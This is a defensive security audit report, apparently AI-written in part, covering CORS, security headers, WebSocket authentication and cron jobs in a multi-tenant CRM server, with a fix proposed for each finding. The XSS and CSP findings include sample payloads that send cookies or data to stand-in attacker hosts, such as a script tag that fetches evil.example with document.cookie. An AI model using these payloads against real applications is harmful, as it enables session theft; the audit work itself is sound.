# S29 — CORS, Helmet, Security Headers, Trust Proxy, Body Limits

Scope: `packages/server/src/index.ts` (middleware ordering, helmet/cors/bodyParser), `packages/server/src/config.ts`
Reviewed: 2026-05-05

---

### [MEDIUM] 10 MB body parsed before `authMiddleware` for `/catalog/bulk-import` — DoS amplifier

**Where:** `packages/server/src/index.ts:1222–1225` (body parser mount) vs `packages/server/src/index.ts:1661` (auth mount)

**What:**
`express.json({ limit: '10mb' })` is registered as a bare `app.post()` route-level middleware at line 1222, before the `authMiddleware` that protects the entire `/api/v1/catalog` tree at line 1661. This means every unauthenticated request to `POST /api/v1/catalog/bulk-import` causes the server to buffer up to 10 MB of JSON into memory before the auth check fires (inside `catalogRoutes` → `adminOnly()`). The global API rate limiter (300 req/min per IP, line 1181) mitigates but does not eliminate the risk: 300 req/min × 10 MB = 3 GB/min of server memory consumed by unauthenticated requests from a single IP.

**Code:**
```typescript
// index.ts:1222-1225 — body parser, no auth
app.post(
  '/api/v1/catalog/bulk-import',
  express.json({ limit: '10mb' }),
);

// index.ts:1661 — auth happens LATER, inside catalogRoutes
app.use('/api/v1/catalog', authMiddleware, catalogRoutes);
// catalog.routes.ts:419 — adminOnly() is inside the router
router.post('/bulk-import', adminOnly, asyncHandler(async (req, res) => {
```

**Exploit:**
An unauthenticated attacker sends 300 POST requests/minute each carrying a 10 MB JSON body to `/api/v1/catalog/bulk-import`. The server buffers all bodies before rejecting with 401. At 300 req/min this is 3 GB/min held in the Node.js heap, which can OOM the process and bring down all tenants.

**Fix:**
Move `authMiddleware` (and ideally an admin-role pre-check) before the 10 MB body parser carve-out, or register the large-body parser as the first handler inside `catalogRoutes` rather than as a global `app.post()`. Alternatively, add a lightweight `Content-Length` pre-check middleware that rejects requests with `Content-Length > 1MB` before any body is buffered unless the JWT is valid.

---

### [MEDIUM] `trust proxy` defaults to loopback-only — rate limiter binds to LB IP, not client IP, in cloud deployments

**Where:** `packages/server/src/index.ts:631–634`, `packages/server/src/config.ts:342–348`

**What:**
When `TRUSTED_PROXY_IPS` is not set, `TRUST_PROXY_ALLOWLIST` falls back to `['loopback']` (line 633). In any deployment behind a cloud load balancer (AWS ALB, GCP GLB, Nginx, Cloudflare) that is not loopback, Express does not trust the LB's `X-Forwarded-For`, so `req.ip` resolves to the LB's socket IP — the same value for every client. The API rate limiter (`consumeWindowRate(limitDb, 'api_v1', ip, …)` at line 1196), the webhook rate limiter (line 1539), and all auth rate limiters (auth.routes.ts) key on `req.ip`, so in this configuration the effective per-IP budget is shared across all clients. A single attacker can consume the entire allowance (300 req/min) for all users behind the LB, or conversely one bad client is effectively unthrottled because the counter reflects the whole tenant fleet. There is no startup warning emitted when `TRUSTED_PROXY_IPS` is unset, making this misconfiguration silent.

**Code:**
```typescript
// index.ts:631-634
const TRUST_PROXY_ALLOWLIST = config.trustedProxyIps.length
  ? [...config.trustedProxyIps, '127.0.0.1', '::1']
  : ['loopback'];
app.set('trust proxy', TRUST_PROXY_ALLOWLIST);

// index.ts:1192-1196 — rate limiter uses req.ip
const ip = req.ip || req.socket?.remoteAddress || 'unknown';
const limitDb: Database.Database = (req.db as Database.Database | undefined) ?? db;
const result = consumeWindowRate(limitDb, 'api_v1', ip, API_RATE_LIMIT, API_RATE_WINDOW);
```

**Exploit:**
An operator deploys behind AWS ALB without setting `TRUSTED_PROXY_IPS`. All 300 API requests/minute are attributed to the ALB's private IP. A single attacker sending 300 req/min exhausts the rate-limit budget for all legitimate users on the instance, achieving an unauthenticated rate-limit bypass DoS. Alternatively, an attacker who knows this is the case can make unlimited requests (the counter never hits their personal IP).

**Fix:**
Emit a startup `console.warn` when `TRUSTED_PROXY_IPS` is unset and `NODE_ENV=production`, advising operators to configure the env var. Document in `.env.example` that `TRUSTED_PROXY_IPS` must list the private IP(s) of the load balancer so `req.ip` resolves to the true client IP. Consider detecting the common case (process receives non-loopback `X-Forwarded-For` but trust proxy is loopback-only) and warning at request time.

---

### [LOW] WebSocket origin check allows `localhost`/`127.0.0.1` in production — inconsistent with HTTP CORS

**Where:** `packages/server/src/index.ts:819–825` (WS) vs `packages/server/src/index.ts:1069–1073` (HTTP CORS)

**What:**
`isCorsOriginAllowed()` (HTTP CORS) wraps the loopback/LAN acceptance in `if (config.nodeEnv !== 'production')` (line 1069), correctly rejecting `Origin: http://localhost` in production. However `isWsOriginAllowed()` (WebSocket upgrade verification) has an unconditional `hostname === 'localhost' || hostname === '127.0.0.1'` block (lines 821–822) with no production guard. In production, a page served from localhost (Electron app, local dev server, `file://` via a local HTTP server) can open an authenticated WebSocket to the production server even though the same origin would be CORS-rejected on HTTP. WS sessions still require a valid JWT (sent via `{type:'auth', token:'...'}` within 5 seconds per line 341), so the blast radius is limited to clients who have a valid token — but the origin mismatch is a policy inconsistency that could be leveraged in a Cross-Site WebSocket Hijacking scenario where a localhost-served page is open alongside a logged-in production tab.

**Code:**
```typescript
// index.ts:819-825 — no production guard; always allows localhost
if (
  /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|100\.)/.test(hostname) ||
  hostname === 'localhost' ||
  hostname === '127.0.0.1' ||
  hostname.endsWith('.localhost')
) {
  return true;
}

// index.ts:1069-1073 — HTTP CORS correctly restricts to non-production
if (config.nodeEnv !== 'production') {
  if (/^(10\.|...)/.test(hostname) || hostname === 'localhost' || ...) {
    return true;
  }
}
```

**Exploit:**
In production, an attacker social-engineers the victim (who has an active CRM JWT) into opening a locally-served page. That page calls `new WebSocket('wss://crm.example.com')` and sends the victim's JWT (obtained via `localStorage` if the SPA stores it there) as the `auth` message. The WS upgrade succeeds because `isWsOriginAllowed('http://localhost:3000')` returns `true` unconditionally.

**Fix:**
Add a production guard to `isWsOriginAllowed` for the loopback block, mirroring `isCorsOriginAllowed`. The Electron management app (the intended consumer of WS from localhost) authenticates via `localhostOnly` + super-admin JWT on the HTTP API layer; if it also needs WS, add its origin explicitly to `ALLOWED_ORIGINS`.

---

### [LOW] CSP `connectSrc` contains bare `ws:` and `wss:` — allows JavaScript to open WebSockets to any host

**Where:** `packages/server/src/index.ts:954`

**What:**
The global Content-Security-Policy emitted by Helmet includes `connectSrc: ["'self'", 'ws:', 'wss:', 'https:', ...]`. Bare `ws:` and `wss:` (without a hostname) are host-wildcard values in CSP: they allow any script on the page to `new WebSocket('wss://attacker.com/exfil')` without violating the policy. Combined with `'https:'` in the same directive (allows `fetch('https://attacker.com/beacon')`), the CSP provides no meaningful `connect-src` restriction against data exfiltration in an XSS scenario. The intent (per the comment on line 936) is PWA connectivity to supplier CDNs, but `ws:` / `wss:` in particular do not have a legitimate broad-hostname use case in this application — the app's own WebSocket is same-origin.

**Code:**
```typescript
// index.ts:954
connectSrc: ["'self'", 'ws:', 'wss:', 'https:', 'https://cloudflareinsights.com'],
```

**Exploit:**
If an XSS payload executes in the CRM SPA context, it can exfiltrate data over WebSocket to any attacker-controlled server (`wss://c2.attacker.com`) or via HTTPS fetch to any endpoint. The bare `ws:`/`wss:` values are particularly dangerous because WebSocket connections are not subject to CORS and leak the session cookie.

**Fix:**
Restrict `connectSrc` to `'self'` plus explicitly named hostnames for the WebSocket endpoint (`wss://crm.example.com`, or dynamically include `wss://${baseDomain}` and `wss://*.${baseDomain}`). For Cloudflare analytics, the existing explicit `https://cloudflareinsights.com` entry is correct; remove bare `https:` and `ws:`/`wss:` wildcards and enumerate the narrow set of external hosts actually needed.

---

### [LOW] HSTS `maxAge` is 180 days — below Mozilla/NIST recommended 1-year minimum for durable protection

**Where:** `packages/server/src/index.ts:922–924`

**What:**
Strict-Transport-Security is set with `maxAge: 15552000` (180 days, ~6 months). The Mozilla Observatory and NIST SP 800-52 Rev 2 both recommend at least one year (`maxAge: 31536000`) for HSTS to be effective against SSL-stripping attacks during periods when the user has not visited the site recently. Browsers purge HSTS entries after their max-age expires; a 6-month window means users who don't return for >6 months lose the protection. The `preload` flag is intentionally absent (noted in comments), which is acceptable, but the short max-age weakens the defence even for regular users.

**Code:**
```typescript
// index.ts:922-924
const hstsConfig = config.nodeEnv === 'production'
  ? { maxAge: 15552000, includeSubDomains: true } // 180 days
  : false as const;
```

**Exploit:**
A user who has not visited the CRM in more than 6 months has their HSTS policy expired. An on-path attacker (rogue Wi-Fi, BGP hijack) can perform an SSL-strip attack on the user's next connection, downgrading HTTPS to HTTP and intercepting credentials or session tokens.

**Fix:**
Increase `maxAge` to `31536000` (1 year): `{ maxAge: 31536000, includeSubDomains: true }`. Once operator deployments are stable on a real TLS cert, consider adding `preload: true` and registering on hstspreload.org for the maximum protection level.

---

### [LOW] Super-admin SPA Content-Security-Policy allows `'unsafe-inline'` in `script-src`

**Where:** `packages/server/src/index.ts:1495`

**What:**
The `spaCsp` string applied to all `/super-admin/*` responses (line 1502) includes `script-src 'self' 'unsafe-inline'`. This is acknowledged in the comment (line 1492: "the cost of running a Vite bundle") but means the super-admin panel has no XSS protection for inline scripts. Any reflected or stored XSS vector in the super-admin UI (e.g., via a tenant name, announcement body, or error message rendered without escaping) can execute arbitrary JavaScript with full super-admin API access. The `/super-admin` tree is localhost-only (`localhostOnly` middleware), which substantially limits the attack surface, but the Electron renderer or a local browser accessing the super-admin SPA is fully exposed.

**Code:**
```typescript
// index.ts:1495
const spaCsp = "default-src 'self'; script-src 'self' 'unsafe-inline'; script-src-attr 'none'; ...";
```

**Exploit:**
If an attacker can inject content into a tenant record (e.g., a tenant slug or display name) that appears unescaped in the super-admin React SPA, they can execute script in the `'unsafe-inline'`-permitted context. Because this is the super-admin panel, the XSS would have access to all super-admin API endpoints including tenant provisioning, billing, and the master DB.

**Fix:**
Replace `'unsafe-inline'` with a per-request nonce or a hash of the Vite entrypoint script. Modern Vite (v4+) supports nonce injection via `vite-plugin-csp` or the official `@vitejs/plugin-nonce`. Alternatively, build the management SPA with `legacy: false` mode which uses ES modules and eliminates the inline bootstrap script that requires `'unsafe-inline'`.

---

### [INFO] CSP `connectSrc` and `imgSrc` contain bare `https:` — allows fetch/image from any HTTPS origin

**Where:** `packages/server/src/index.ts:953–954`

**What:**
Both `imgSrc` and `connectSrc` include the bare scheme `https:`, which is equivalent to a host wildcard for all HTTPS origins. This is documented as intentional ("PWA fetches supplier CDN thumbnails"). While the risk of image-src being broad is limited (image loads don't carry credentials for CORS requests), `connectSrc: 'https:'` allows `fetch` / `XMLHttpRequest` to any HTTPS endpoint, weakening the CSP as a data-exfiltration barrier. In an XSS scenario the policy provides no `connect-src` protection beyond the WebSocket restriction.

**Code:**
```typescript
// index.ts:953-954
imgSrc: ["'self'", 'data:', 'blob:', 'https:'],
connectSrc: ["'self'", 'ws:', 'wss:', 'https:', 'https://cloudflareinsights.com'],
```

**Fix:**
Enumerate the actual external domains needed (Cloudflare Insights, the specific supplier CDN domains) instead of `https:`. Even a partial allowlist (e.g., `https://*.shopify.com https://*.aliexpress.com`) dramatically reduces the exfiltration surface in an XSS scenario. The `imgSrc: 'https:'` is lower-risk but still worth narrowing.

---

### [INFO] No startup warning when `TRUSTED_PROXY_IPS` is unset in production

**Where:** `packages/server/src/config.ts:342–348`, `packages/server/src/index.ts:631–634`

**What:**
When `TRUSTED_PROXY_IPS` is not set, `config.trustedProxyIps` is an empty array and `trust proxy` falls back to `['loopback']` silently. There is no `console.warn` at boot time informing operators that rate limiting will be ineffective in load-balanced deployments. Operators who follow the quick-start guide without reading the full env-var reference will unknowingly deploy with a broken rate limiter.

**Code:**
```typescript
// config.ts:342-348
trustedProxyIps: (() => {
  const raw = process.env.TRUSTED_PROXY_IPS || '';
  return raw.split(',').map(s => s.trim()).filter(Boolean);
})(),
// No warning emitted when this returns []
```

**Fix:**
In `index.ts`, after setting `trust proxy`, emit `console.warn` when `config.trustedProxyIps.length === 0 && config.nodeEnv === 'production'` advising the operator to configure `TRUSTED_PROXY_IPS`. Add an example entry to `.env.example`.

---

## Items verified clean

- **`cors({ origin: true })` / wildcard reflect**: Not present. CORS `origin` callback explicitly validates against `isCorsOriginAllowed()` and only returns `true` for vetted origins. `credentials: true` never rides on a wildcard or unvetted reflection.
- **`cors({ origin: '*' })` with credentials**: Not present. The `*` wildcard is never used.
- **ALLOWED_ORIGINS whitespace / prefix injection**: `process.env.ALLOWED_ORIGINS?.split(',').map(o => o.trim()).filter(Boolean)` at lines 782 and 1006 properly trims whitespace on both sides before adding to the allowlist. No prefix-bypass possible.
- **Helmet absent**: Helmet v8 is fully configured at line 943 with explicit `noSniff`, `referrerPolicy`, `frameguard`, `hsts`, and CSP.
- **`X-Content-Type-Options: nosniff`**: Explicitly enabled via `noSniff: true` (line 965); helmet emits the header on every response.
- **`X-Frame-Options`**: Set to `DENY` via `frameguard: { action: 'deny' }` (line 972) and `frame-ancestors: 'none'` in CSP (line 957). Widget routes override to exact-origin per the allowlist (lines 1828–1829).
- **Referrer-Policy**: `strict-origin-when-cross-origin` set via `referrerPolicy` (line 968).
- **`X-Powered-By` header**: Explicitly disabled at line 914 (`app.disable('x-powered-by')`), before helmet which also removes it.
- **Body limit — global 1 MB**: Global `express.json({ limit: '1mb' })` at line 1228 and `express.urlencoded({ limit: '1mb' })` at line 1233.
- **`urlencoded({ extended: true })` without limits**: `qs` library defaults apply (`parameterLimit: 1000`, `arrayLimit: 20`, `depth: 5`); these are not dangerously permissive.
- **HSTS absent in non-production**: Confirmed — `hstsConfig = false` when not production (line 924); HSTS is never burned into dev browsers.
- **`app.disable('x-powered-by')` missing**: Confirmed present at line 914.
- **CORS allowed-origins normalized**: `normalizeOrigin()` strips default ports before comparison, so `https://localhost:443` correctly matches `https://localhost` from a browser (lines 989–999).
- **Cross-Origin-Opener-Policy**: Helmet v8 enables `COOP: same-origin` by default; it is not disabled in the helmet config (only `crossOriginEmbedderPolicy: false` is explicitly disabled at line 962), so COOP is active.


---

# S30-websocket

# S30 — WebSocket Authentication, Authorization, Message Handling, Broadcast Scoping

---

### [HIGH] WS auth bypasses session revocation — revoked JWT authenticates new socket

**Where:** `packages/server/src/ws/server.ts:443–450`
Also compare: `packages/server/src/middleware/auth.ts:126–129` (HTTP middleware checks sessions table), `packages/server/src/routes/auth.routes.ts:1420` (logout deletes session)

**What:**
The HTTP `authMiddleware` verifies a JWT *and* queries `sessions WHERE id = ? AND expires_at > datetime('now')`, rejecting tokens whose session row was deleted (logout, forced-logout, admin-disable). The WS `auth` message handler at line 443 calls `verifyJwtWithRotation()` only — no session DB lookup. A revoked JWT (user logged out, password changed, account disabled) will still successfully authenticate a new WebSocket connection for up to 1 hour (the access-token TTL). Additionally, once a WS connection is established the token is never re-checked: an existing connection outlives both the JWT's expiry and any subsequent session deletion indefinitely.

**Code:**
```typescript
const payload = verifyJwtWithRotation(
  tokenCandidate,
  'access',
  JWT_VERIFY_OPTIONS,
) as { userId: number; tenantSlug?: string | null; role?: string };
ws.userId = payload.userId;
// No session lookup. HTTP middleware does:
//   SELECT id FROM sessions WHERE id = ? AND expires_at > datetime('now')
// WS never does this, so a deleted session passes here.
ws.tenantSlug = payload.tenantSlug || null;
```

**Exploit:**
Attacker steals a staff JWT (XSS, memory inspection, shared device). Victim clicks "Logout" — session row deleted. Attacker immediately opens a WS connection with the stolen token: the auth handler accepts it because it only verifies the signature, not the session. The attacker receives all tenant WS broadcasts (ticket updates, invoice events, SMS messages) for up to 60 minutes.

**Fix:**
Add an async DB lookup inside the WS `auth` handler that replicates the HTTP middleware session check. Require `asyncDb` access (pass it into `setupWebSocket` from `index.ts`). Additionally implement a 30-minute re-authentication sweep that terminates connections whose session row no longer exists or whose JWT `exp` has passed.

---

### [MEDIUM] Missing `payload.type` guard in WS auth allows future token-type confusion

**Where:** `packages/server/src/ws/server.ts:443–450` vs `packages/server/src/middleware/auth.ts:86–89`

**What:**
The HTTP `authMiddleware` checks `payload.type !== 'access'` and rejects the token with 401. The WS auth handler casts the verified payload to `{ userId; tenantSlug?; role? }` with no `type` field assertion — it does not verify `payload.type === 'access'`. Currently mitigated because access tokens are signed with `config.accessJwtSecret` (HKDF-derived) and refresh tokens with `config.refreshJwtSecret` (different HKDF derivation), so a refresh token will fail signature verification. However, in the transition period documented in `utils/jwtSecrets.ts` when `ACCESS_JWT_SECRET` is not set in env, both access and refresh tokens may fall back to the raw `JWT_SECRET`, allowing a refresh token to pass the WS signature check and authenticate a WS socket with a long-lived (30/90 day) credential that the HTTP layer would reject.

**Code:**
```typescript
// HTTP middleware — line 86:
if (payload.type !== 'access') {
  res.status(401).json(errorBody(ERROR_CODES.ERR_AUTH_INVALID_TOKEN_TYPE, ...));
  return;
}

// WS auth handler — line 447: no type check at all
) as { userId: number; tenantSlug?: string | null; role?: string };
ws.userId = payload.userId;
```

**Exploit:**
During the transition window (before `ACCESS_JWT_SECRET`/`REFRESH_JWT_SECRET` are set), an attacker who can read the refresh token from its `HttpOnly` cookie (e.g. via SSRF to `/api/v1/auth/refresh`, or OS-level cookie access on a shared kiosk) sends it as the WS `auth` token. The socket authenticates and stays alive for up to 90 days, bypassing the 1-hour access-token expiry.

**Fix:**
Add `if ((payload as any).type !== 'access') throw new Error('wrong token type')` immediately after `verifyJwtWithRotation` returns. Mirror the HTTP middleware logic exactly.

---

### [MEDIUM] POS `/sales` broadcast misses `tenantSlug` — events misdirected in multi-tenant

**Where:** `packages/server/src/routes/pos.routes.ts:1323`

**What:**
Every other route that calls `broadcast()` for tenant-scoped events passes `req.tenantSlug || null`. The `/pos/sales` handler at line 1323 calls `broadcast(WS_EVENTS.INVOICE_CREATED, { invoice_id, order_id })` with **no third argument**, so `tenantSlug` defaults to `null`. The `broadcast()` function routes to the `tenantBucketKey(null)` bucket which, in multi-tenant mode, contains only super-admin/management sockets — not the tenant's staff. The invoice-created event is silently dropped for all tenant clients. In single-tenant mode the null bucket contains all staff so the event is delivered, masking the bug in development. A separate `POST /pos/ticket` at line 2447 correctly passes `req.tenantSlug || null`.

**Code:**
```typescript
// pos.routes.ts:1323 — missing third argument
broadcast(WS_EVENTS.INVOICE_CREATED, { invoice_id: inv.id, order_id: invoiceOrderId });

// Every other caller correctly does:
broadcast(WS_EVENTS.INVOICE_CREATED, invoice, req.tenantSlug || null);
```

**Exploit:**
In a multi-tenant deployment, a POS cashier completes a sale via `/pos/sales`. No `invoice:created` WS event is delivered to the tenant's web clients, so the UI does not update in real-time. Super-admin management consoles erroneously receive the event (invoice ID, order ID) from a tenant they may not be authorized to view at the WS layer, constituting a cross-scope data exposure to management-dashboard observers.

**Fix:**
Change line 1323 to `broadcast(WS_EVENTS.INVOICE_CREATED, { invoice_id: inv.id, order_id: invoiceOrderId }, req.tenantSlug || null)`.

---

### [LOW] `management:stats` and `management:crash` broadcast to all staff in single-tenant mode

**Where:** `packages/server/src/index.ts:2380`, `packages/server/src/index.ts:3886`
Also: `packages/server/src/services/githubUpdater.ts:337`

**What:**
Three platform broadcasts — `management:stats` (process memory, uptime, request rates, active connection count every 5 s), `management:crash` (error message, partial stack trace, crashed route path), and `management:update_available` (current/latest commit SHA, commit message) — are sent with `tenantSlug = null` (the default). In single-tenant deployments all authenticated sockets live in the `null` bucket, so every logged-in staff member including the `staff` role receives these. No role gate is applied inside `broadcast()` for these event types. The `scrubSensitive()` function does not filter non-PII operational data. A staff user opening the browser dev-tools WS inspector sees server memory consumption, crash details (file paths, DB column/table names in error messages despite partial redaction), and internal commit SHAs.

**Code:**
```typescript
// index.ts:2380 — no tenantSlug, no role filter
broadcast('management:stats', {
  uptime: process.uptime(),
  memory: { rss, heapUsed, heapTotal },
  activeConnections: allClients.size,
  requestsPerSecond: getRequestsPerSecond(),
  requestsPerMinute: getRequestsPerMinute(),
});
// index.ts:3886
broadcast('management:crash', entry); // CrashEntry: route, errorMessage, errorStack
```

**Exploit:**
A staff user (e.g. a part-time cashier) connects to the WS and listens to raw frames. Every 5 seconds they receive heap/RSS memory data useful for timing memory-exhaustion attacks. On any server crash they receive `errorStack` containing DB query strings, internal file paths, and column names that help fingerprint the technology stack for targeted injection or path-traversal attempts.

**Fix:**
Add a role guard inside the broadcast loop for `management:*` events (check `ws.role === 'admin'` or a new `MANAGEMENT_ROLES` set), or switch these broadcasts to use a dedicated management socket bucket that only super-admin / local Electron connections land in. Alternatively, use `sendToUser` targeted to specific admin user IDs instead of a bucket broadcast.

---

### [LOW] WS connection persists indefinitely after JWT expiry — no revalidation or expiry timeout

**Where:** `packages/server/src/ws/server.ts:301–643`

**What:**
The JWT is validated exactly once at the `auth` message. After that, the connection lives as long as the TCP session and the heartbeat keep it alive (30-second ping/pong, no upper-bound). The `JWT_VERIFY_OPTIONS` include the `exp` claim (jsonwebtoken enforces expiry), but only at auth time. A WS socket authenticated at t=0 with a 1-hour access token remains registered in `clients` and `clientsByTenant` at t=2h, t=24h, etc., receiving all future broadcasts. This contradicts the 1-hour access-token design and the IDLE_SESSION_MAX_DAYS policy enforced by HTTP middleware.

**Code:**
```typescript
// One-time auth — no subsequent recheck
ws.userId = payload.userId;
ws.tenantSlug = payload.tenantSlug || null;
ws.role = ...;
// Socket stays in clientsByTenant forever after this.
// No scheduled re-check of exp or session validity.
```

**Exploit:**
An employee whose access token expires (after 1 h) should lose real-time access when their session also idles out. On HTTP they'd get 401 on the next API call. On WS, they continue receiving all tenant broadcasts — ticket updates, SMS messages, invoice events — until they manually close the browser or lose network. An attacker who briefly steals credentials, authenticates a WS connection, and loses the token still retains live broadcast access indefinitely.

**Fix:**
Schedule a periodic re-check (e.g. every 15 minutes) that re-verifies the JWT's `exp` and re-queries the sessions table for each active socket. On failure, close the socket with code 4401 (application-level auth expiry). Use `jwt.decode()` (no re-verify needed) to read the `exp` claim for cheap local expiry checks.

---

### [INFO] WS `auth` handler does not check `payload.type === 'access'` — missing defense-in-depth

*(Combined with the HIGH finding on session revocation — see MEDIUM finding above for full detail.)*

---

### [INFO] `authTimeout` closes on malformed message but auth-retry path allows rapid socket recycling

**Where:** `packages/server/src/ws/server.ts:405–415`

**What:**
When a malformed message is received before auth, `clearAuthTimeout()` is called and the socket is kept open (not closed). The 5-second auth timer has been cancelled so the socket can now idle indefinitely as an unauthenticated connection consuming a slot in the per-IP cap. A client that rapidly sends malformed messages just before the 5-second window expires gets their socket kept alive past the timeout window.

**Code:**
```typescript
const msg = parseInbound(raw);
if (!msg) {
  log.warn('ws malformed inbound message', { ... });
  clearAuthTimeout(); // Timer cleared but socket NOT closed
  return;             // Socket stays open, no longer on a death timer
}
```

**Exploit:**
An attacker connects 20 sockets (per-IP cap), sends a malformed message on each just before the 5s timer fires, cancelling the timers. The sockets now hold slots at the per-IP cap level indefinitely without being authenticated, starving legitimate clients from the same IP.

**Fix:**
On receiving any malformed pre-auth message, close the socket immediately (`ws.close(1008, 'invalid message')`) rather than just cancelling the auth timer. Or re-arm a shorter (1 s) timer after a malformed pre-auth message.

---


---

# S31-cron

# S31 — Cron / Background Jobs / Scheduled Services

Auditor: Claude (Sonnet 4.6)
Scope: `packages/server/src/services/dunningScheduler.ts`, `recurringInvoicesCron.ts`, `slaBreachCron.ts`, `slaAssignment.ts`, `retentionSweeper.ts`, `dataExportScheduleCron.ts`, `giftCardExpirySweep.ts`, `receiptOcrCron.ts`, `reportEmailer.ts`, `scheduledReports.ts`, `customerHealthScore.ts`, `usageTracker.ts`, `middleware/localhostOnly.ts`, and related inline crons in `index.ts`.

---

### MEDIUM Stored XSS via unescaped schedule.name in data-export delivery email HTML

**Where:** `packages/server/src/services/dataExportScheduleCron.ts:231–233`

**What:**
When a scheduled data export completes, the cron sends a delivery email whose HTML body directly interpolates `schedule.name` without `escapeHtml()`. An admin who creates a schedule with a crafted name such as `<img src=x onerror=alert(document.cookie)>` will have that payload execute in the delivery recipient's email client when the export fires.

**Code:**
```typescript
await sendEmail(db, {
  to: schedule.delivery_email,
  subject: `Data export ready — ${schedule.name}`,
  html: [
    `<p>Your scheduled data export "<strong>${schedule.name}</strong>" has completed.</p>`,
    `<ul>`,
    `<li>Export type: ${exportType}</li>`,
    `<li>Rows exported: ${rowCount.toLocaleString()}</li>`,
    `<li>File: ${fileName}</li>`,
    `</ul>`,
  ].join(''),
});
```

**Exploit:**
An admin (or an attacker who has compromised an admin account) creates a data-export schedule with name `<script>fetch('https://evil.example/'+document.cookie)</script>`. When the hourly cron fires and the export succeeds, the email client of every address in `delivery_email` executes the payload — enabling session theft or credential harvesting. The `delivery_email` is also admin-controlled, so a compromised admin could self-direct the attack toward another admin's inbox.

**Fix:**
Import `escapeHtml` from `../utils/escape.js` and wrap all template variables in the `html` array with it: `escapeHtml(schedule.name)`, `escapeHtml(exportType)`. The filename is already nonce-based and safe, but should also be escaped for defence-in-depth.

---

### LOW SMS content injection — inline follow-up crons omit stripSmsControlChars

**Where:** `packages/server/src/index.ts:2875`, `:3181`, `:3268`, `:3341`

**What:**
Four inline cron blocks (appointment reminders, stale-ticket follow-ups, invoice reminders, estimate follow-ups) interpolate customer-controlled strings directly into SMS body strings without calling `stripSmsControlChars`. The `dunningScheduler.ts` service (the only cron that was extracted to its own module) correctly calls `renderTemplate(…, vars, 'sms')` which strips Unicode control characters, right-to-left marks, and other characters that can truncate or spoof SMS segments. The inline crons share the same risk but were never given the same treatment.

**Code:**
```typescript
// index.ts:2875 (appointment reminder)
const body = `Hi ${appt.first_name || 'there'}, reminder: you have an appointment at ${storeName} — ${appt.title}. See you soon!`;

// index.ts:3181 (stale ticket)
const body = `Hi ${ticket.customer_name || 'there'}, your repair (${ticket.order_id}) is still in progress at ${storeName}. We'll update you soon.`;

// index.ts:3268 (invoice reminder — custom template path)
const body = customTemplate
  ? customTemplate
      .replace(/\{name\}/g, inv.customer_name || 'there')
      // ... no stripSmsControlChars applied to substituted values
```

**Exploit:**
A customer whose first name is stored as `u202Bmalicious‫text` (Unicode bidirectional override) can cause SMS segments to display reordered or truncated text to their own phone number, creating a social-engineering vector where the operator's SMS appears to say something it does not. An appointment with a crafted `title` (no admin role required to create via `POST /api/v1/leads/appointments`, only `authMiddleware`) propagates unsanitized control characters through the nightly reminder batch.

**Fix:**
Import `stripSmsControlChars` from `../utils/escape.js` and apply it to every customer-sourced variable (`first_name`, `customer_name`, `order_id`, `appt.title`, `storeName`) before interpolation. Alternatively, extract the body construction into a shared helper that mirrors the `renderTemplate(…, vars, 'sms')` pattern already used in `dunningScheduler.ts`.

---

### LOW NaN guard bypass allows cron to run with no effective date filter

**Where:** `packages/server/src/index.ts:3129–3130`, `:3220–3221`, `:3302–3304`

**What:**
Three inline crons guard against zero/negative day values with `parseInt(cfgRow?.value || '0', 10) <= 0` but `parseInt` returns `NaN` for non-numeric config values (e.g., `stall_followup_days = 'disabled'`). `NaN <= 0` is `false` in JavaScript, so the guard passes and the cron proceeds. In better-sqlite3, binding `NaN` to a prepared statement converts it to `NULL`; SQLite then evaluates `'-' || NULL || ' days'` to `NULL`, making `updated_at < datetime('now', NULL)` always `UNKNOWN` — so no rows are returned and no SMS is sent. However, an operator who enters a very large number (e.g., `999999`) passes the guard and causes the WHERE clause to match every ticket created before the heat-death of the universe, sending SMS to up to `LIMIT 20` customers per tick regardless of actual staleness.

**Code:**
```typescript
const stallDays = parseInt(cfgRow?.value || '0', 10);
if (stallDays <= 0) return; // Feature disabled — NaN bypasses this check

// Later bound to: datetime('now', '-' || ? || ' days')
`).all(stallDays, stallDays, stallDays) as any[];
```

**Exploit:**
An admin sets `stall_followup_days` to `'xyz'` via `PUT /api/v1/settings/config`. `parseInt('xyz', 10)` returns `NaN`; `NaN <= 0` is false; the cron proceeds. In practice better-sqlite3 converts the NaN binding to NULL so no rows match and no SMS fires — but the code path is logically broken and a future change to the query structure could make it exploitable. More concretely, setting `stall_followup_days = 999999` causes the date predicate `updated_at < datetime('now', '-999999 days')` to match all tickets created in approximately the year 998973 CE or earlier — effectively matching ALL historical tickets on older SQLite builds that clamp date overflow.

**Fix:**
Replace the `parseInt(…) <= 0` guard with a positive finite check: `const n = Number.parseInt(cfgRow?.value, 10); if (!Number.isFinite(n) || n <= 0 || n > 365) return;`. Cap at a maximum of 365 days to prevent the large-number scenario. Apply the same pattern to `estimate_followup_days` and `invoice_reminder_days`.

---

### INFO localhostOnly middleware correctly resists X-Forwarded-For bypass

**Where:** `packages/server/src/middleware/localhostOnly.ts:26–32`

**What:**
`localhostOnly` uses `req.socket?.remoteAddress` (the raw TCP peer address) rather than Express's `req.ip`, which honours `X-Forwarded-For` when `trust proxy` is set. An attacker who passes `X-Forwarded-For: 127.0.0.1` cannot spoof the socket address. The loopback set includes all IPv4/IPv6 loopback forms including the Docker WSL2 variant.

**Code:**
```typescript
const rawIp = req.socket?.remoteAddress || '';
const ip = rawIp.toLowerCase();
const isLocal =
  LOCALHOST_IPS.has(ip) ||
  (ip.startsWith('::ffff:') && ip.slice('::ffff:'.length) === '127.0.0.1');
```

**Exploit:**
No bypass identified. This control is implemented correctly.

**Fix:**
No action required. For defence-in-depth, document that any future addition of a reverse proxy in front of the server must not change the binding of `/super-admin` or `/management/api` routes.

---

### INFO forEachDb / forEachDbAsync correctly filters terminated tenants

**Where:** `packages/server/src/index.ts:205`, `:255`

**What:**
Both cron iteration helpers query `tenants WHERE status = 'active'` before opening any tenant DB handle. Suspended, cancelled, and terminated tenants are never iterated. The cron services that accept an external `getDbsFn` callback (e.g., `startRecurringInvoicesCron`, `startSlaBreachCron`, `startDataExportScheduleCron`) all source their tenant list through `forEachDb`, so they inherit the same filter.

**Code:**
```typescript
const tenants = masterDb
  .prepare("SELECT slug FROM tenants WHERE status = 'active'")
  .all() as { slug: string }[];
```

**Exploit:**
No issue. Crons do not continue for terminated tenants.

**Fix:**
No action required. Confirm that the `tenantTermination.ts` service sets `status = 'terminated'` (or similar non-`'active'` value) before the LRU pool evicts the DB handle to avoid a brief window where a just-terminated tenant is still in the pool but a tick fires.

---

